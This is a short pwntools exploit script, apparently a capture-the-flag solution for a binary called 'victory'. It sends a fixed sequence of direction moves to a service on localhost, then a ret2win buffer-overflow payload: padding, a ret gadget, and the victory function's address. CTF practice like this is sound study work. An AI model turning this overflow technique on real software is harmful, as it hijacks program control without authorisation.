from pwn import *


winning_array = [b"North" , b"North" , b"South" , b"West" , b"North" , b"West" , b"East" , b"South" ,
    b"West" , b"West" , b"West" , b"East" , b"North" , b"East" , b"West" , b"East" ,
    b"North" , b"West" , b"South" , b"South" , b"East" , b"North" , b"East" , b"South" ,
    b"South" , b"East" , b"West" , b"East" , b"West" , b"North" , b"North" , b"South" ,
    b"East" , b"West" , b"West" , b"East" , b"East" , b"East" , b"North" , b"North" ,
    b"West" , b"South" , b"South" , b"South" , b"North" , b"North" , b"North" ,
    b"East" , b"West" , b"East" , 
    b"South" , b"South" , b"West" , b"East" , b"North" , b"West" , b"North" , b"East" ,
    b"South" , b"South" , b"East" , b"West" , b"North" , b"East" , b"South" , b"West" ,
    b"East" , b"North" , b"South" , b"East" , b"West" , b"North" , b"South" , b"East" ,
    b"West" , b"North" , b"East" , b"South" , b"West" , b"East" , b"North" , b"South" ,
    b"West" , b"East" , b"North" , b"East" , b"South" , b"West" , b"North" , b"East"    ]


context.binary = binary = ELF("./victory")

offset = 56


# p = process(level="debug")
p =remote('localhost', 1337)


victory_address = p64(binary.symbols.victory)

ret_address = p64(0x0000000000401016)

p.recvuntil(b': ')
p.sendline(b'1')
p.recv()
for i in range(len(winning_array)):
    p.sendline(winning_array[i])
    print(winning_array[i])
    print(p.recv())



paylaod = b"A" * offset + ret_address + victory_address
p.sendline(paylaod)

p.interactive()